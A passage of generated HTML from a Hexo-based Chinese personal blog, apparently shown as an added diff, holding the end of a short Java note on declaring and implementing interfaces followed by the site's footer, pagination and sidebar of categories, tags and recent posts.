+<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
+<p>关键字：<code>interface</code></p>
+<pre><code>[访问控制关键字] interface 接口名称 [extends 其他的接口名] {
+        // 声明变量
+        // 抽象方法
+}
+</code></pre>
+<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
+<p>关键字：<code>implements</code></p>
+<pre><code>public class A implements 接口名称 [,接口名称,...]{
+		//实现接口中的方法
+}
+</code></pre>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-04-26T16:00:00.000Z" itemprop="datePublished">2020-04-27</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+
+  
+    <nav class="pagination">
+        <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next</a>
+    </nav>
+  
+</div>
+
+                </section>
+            </section>
+
+            
+            <aside class="sidebar ">
+                
+
+
+<div class="widget" id="widget">
+    
+      
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/%E6%9D%82%E9%A1%B9/">杂项</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/">专业课</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/">计网</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/Markdown/">Markdown</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/">go</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GUI/" rel="tag">GUI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSH/" rel="tag">SSH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E9%AA%8C/" rel="tag">实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B9%B6%E5%8F%91/" rel="tag">并发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" rel="tag">消息队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%90%E7%BB%B4/" rel="tag">运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag">面试</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/27/%E5%B7%A5%E5%85%B7/redis/">Redis笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/">已安装程序（服务）的运行方式</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">漏洞/Java反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">密码算法</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/26/%E5%B7%A5%E5%85%B7/git/">git笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <!-- Please do not remove this -->
+    <!-- 开源不易，请勿删除 -->
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            Dawnyh&#39;s Blog &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://linhong.me/" target="_blank">Aomori</a> · <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Github</a>
+        </div>
+    </div>
+
+</footer>
+
+<script type="module" src="https://unpkg.com/ionicons@6.0.2/dist/ionicons/ionicons.esm.js"></script>
+
+
+
+
+
+
+<script src="/dist/build.js?1654266144177.js"></script>
+
+
+<script src="/dist/custom.js?1654266144177.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
